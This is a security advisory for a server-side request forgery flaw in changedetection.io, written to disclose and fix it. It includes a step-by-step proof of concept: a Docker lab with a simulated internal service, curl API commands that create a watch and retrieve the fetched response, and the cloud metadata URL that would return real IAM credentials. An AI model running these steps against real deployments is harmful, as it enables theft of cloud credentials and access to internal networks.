# changedetection.io is Vulnerable to SSRF via Watch URLs

**GHSA**: GHSA-3c45-4pj5-ch7m | **CVE**: CVE-2026-27696 | **Severity**: high (CVSS 8.6)

**CWE**: CWE-918

**Affected Packages**:
- **changedetection.io** (pip): < 0.54.1

## Description

## Summary

Changedetection.io is vulnerable to Server-Side Request Forgery (SSRF) because the URL validation function `is_safe_valid_url()` does not validate the resolved IP address of watch URLs against private, loopback, or link-local address ranges. An authenticated user (or any user when no password is configured, which is the default) can add a watch for internal network URLs such as:

- `http://169.254.169.254`
- `http://10.0.0.1/`
- `http://127.0.0.1/`

The application fetches these URLs server-side, stores the response content, and makes it viewable through the web UI — enabling full data exfiltration from internal services.

This is particularly severe because:

- The fetched content is stored and viewable - this is not a blind SSRF
- Watches are fetched periodically - creating a persistent SSRF that continuously accesses internal resources
- By default, no password is set - the web UI is accessible without authentication
- Self-hosted deployments typically run on cloud infrastructure where `169.254.169.254` returns real IAM credentials

---

## Details

The URL validation function `is_safe_valid_url()` in `changedetectionio/validate_url.py` (lines 60–122) validates the URL protocol (http/https/ftp) and format using the `validators` library, but does not perform any DNS resolution or IP address validation:

```python
# changedetectionio/validate_url.py:60-122
@lru_cache(maxsize=1000)
def is_safe_valid_url(test_url):

    safe_protocol_regex = '^(http|https|ftp):'

    # Check protocol
    pattern = re.compile(os.getenv('SAFE_PROTOCOL_REGEX', safe_protocol_regex), re.IGNORECASE)
    if not pattern.match(test_url.strip()):
        return False

    # Check URL format
    if not validators.url(test_url, simple_host=True):
        return False

    return True  # No IP address validation performed
```

The HTTP fetcher in `changedetectionio/content_fetchers/requests.py` (lines 83–89) then makes the request without any additional IP validation:

```python
# changedetectionio/content_fetchers/requests.py:83-89
r = session.request(method=request_method,
                    url=url,            # User-provided URL, no IP validation
                    headers=request_headers,
                    timeout=timeout,
                    proxies=proxies,
                    verify=False)
```
The response content is stored and made available to the user:

```python
# changedetectionio/content_fetchers/requests.py:140-142
self.content = r.text     # Text content stored
self.raw_content = r.content  # Raw bytes stored
```
This validation gap exists in all entry points that accept watch URLs:

- Web UI: `changedetectionio/store/__init__.py:718`
- REST API: `changedetectionio/api/watch.py:163, 428`
- Import API: `changedetectionio/api/import.py:188`

All use the same `is_safe_valid_url()` function, so a single fix addresses all paths.

---

## PoC

### Prerequisites

- A changedetection.io instance (Docker deployment)
- Network access to the instance (default port 5000)

### Step 1: Deploy changedetection.io with an internal service

Create `internal-service.py`:
```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            'Code': 'Success',
            'AccessKeyId': 'AKIAIOSFODNN7EXAMPLE',
            'SecretAccessKey': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
            'Token': 'FwoGZXIvYXdzEBYaDExampleSessionToken'
        }).encode())
HTTPServer(('0.0.0.0', 80), H).serve_forever()
```

Create `Dockerfile.internal`:
```
FROM python:3.11-slim
COPY internal-service.py /server.py
CMD ["python3", "/server.py"]
```

Create `docker-compose.yml`:
```yaml
version: "3.8"
services:
  changedetection:
    image: ghcr.io/dgtlmoon/changedetection.io
    ports:
      - "5000:5000"
    volumes:
      - ./datastore:/datastore

  internal-service:
    build:
      context: .
      dockerfile: Dockerfile.internal
```

Start the stack:

```bash
docker compose up -d
```

### Step 2: Add a watch for the internal service

Open `http://localhost:5000/` in a browser (no password required by default).

In the URL field, enter:
```
http://internal-service/
```
Click **Watch** and wait for the first check to complete.

### Step 3: View the exfiltrated data

Click on the watch entry, then click **Preview**. The page displays the internal service’s response containing the simulated credentials:
```json
{
  "Code": "Success",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  ...
}
```
<img width="2291" height="780" alt="Screenshot 2026-02-16 084212" src="https://github.com/user-attachments/assets/115b69fb-ea10-4c47-a38c-409ede0e03cd" />

### Step 4: Verify via API (alternative)
```bash
# Get the API key (visible in Settings page of the unauthenticated web UI)
API_KEY=$(docker compose exec changedetection cat /datastore/url-watches.json | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['settings']['application']['api_access_token'])")

# Create a watch via API
WATCH_RESPONSE=$(curl -s -X POST "http://localhost:5000/api/v1/watch" \
  -H "x-api-key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://internal-service/"}')

WATCH_UUID=$(echo "$WATCH_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['uuid'])")
echo "Watch created: $WATCH_UUID"

# Wait for the first fetch to complete
echo "Waiting 30s for first fetch..."
sleep 30

# Retrieve the exfiltrated data via API
LATEST_TS=$(curl -s "http://localhost:5000/api/v1/watch/$WATCH_UUID/history" \
  -H "x-api-key: $API_KEY" | \
  python3 -c "import sys,json; h=json.load(sys.stdin); print(sorted(h.keys())[-1]) if h else print('')")

echo "=== EXFILTRATED DATA ==="
curl -s "http://localhost:5000/api/v1/watch/$WATCH_UUID/history/$LATEST_TS" \
  -H "x-api-key: $API_KEY"
```
Expected output — the internal service’s response containing simulated credentials:
```json
{
  "Code": "Success",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  ...
}
```

In a real cloud deployment, replacing `http://internal-service/` with:

```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
would return real AWS IAM credentials.

<img width="1140" height="607" alt="Screenshot 2026-02-16 084407" src="https://github.com/user-attachments/assets/cb1f5c02-6604-49e6-9e26-13406b190b45" />

---

## Impact

**Who is impacted:**  
All self-hosted changedetection.io deployments, particularly those running on cloud infrastructure (AWS, GCP, Azure) where the instance metadata service at `169.254.169.254` is accessible.

**What an attacker can do:**

- **Steal cloud credentials:** Access the cloud metadata endpoint to obtain IAM credentials, service account tokens, or managed identity tokens
- **Scan internal networks:** Discover internal services by adding watches for internal IP ranges and observing responses
- **Access internal services:** Read data from internal APIs, databases, and admin interfaces that are not exposed to the internet
- **Persistent access:** Watches are fetched periodically on a configurable schedule, providing continuous access to internal resources
- **No authentication required by default:** The web UI has no password set by default, allowing any user with network access to exploit this vulnerability

---

### Suggested Remediation

Add IP address validation to `is_safe_valid_url()` in `changedetectionio/validate_url.py`:

```python
import ipaddress
import socket

BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),     # Loopback
    ipaddress.ip_network('10.0.0.0/8'),      # Private (RFC 1918)
    ipaddress.ip_network('172.16.0.0/12'),   # Private (RFC 1918)
    ipaddress.ip_network('192.168.0.0/16'),  # Private (RFC 1918)
    ipaddress.ip_network('169.254.0.0/16'),  # Link-local / Cloud metadata
    ipaddress.ip_network('::1/128'),         # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),        # IPv6 unique local
    ipaddress.ip_network('fe80::/10'),       # IPv6 link-local
]

def is_private_ip(hostname):
    """Check if a hostname resolves to a private/reserved IP address."""
    try:
        for info in socket.getaddrinfo(hostname, None):
            ip = ipaddress.ip_address(info[4][0])
            for network in BLOCKED_NETWORKS:
                if ip in network:
                    return True
    except socket.gaierror:
        return True  # Block unresolvable hostnames
    return False
```

Then add to `is_safe_valid_url()` before the final `return True`:

```python
# Check for private/reserved IP addresses
parsed = urlparse(test_url)
if parsed.hostname and is_private_ip(parsed.hostname):
    logger.warning(f"URL '{test_url}' resolves to a private/reserved IP address")
    return False
```

An environment variable (e.g., `ALLOW_PRIVATE_IPS=true`) could be provided for users who intentionally need to monitor internal services.
